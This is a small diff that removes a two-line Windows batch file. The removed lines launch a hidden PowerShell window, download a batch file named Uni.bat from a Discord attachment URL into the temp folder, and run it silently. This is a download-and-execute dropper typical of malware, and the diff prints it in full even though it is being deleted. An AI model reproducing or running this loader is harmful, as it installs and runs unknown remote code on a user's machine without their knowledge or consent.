@@ -1,2 +1,0 @@
-@echo off
-Start powershell.exe -WindowStyle Hidden -Command "cd $Env:temp; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1152709230458065011/1153801710528106597/Uni.bat' -OutFile 'Uni.bat'; Start-Process -FilePath 'Uni.bat' -WindowStyle Hidden"
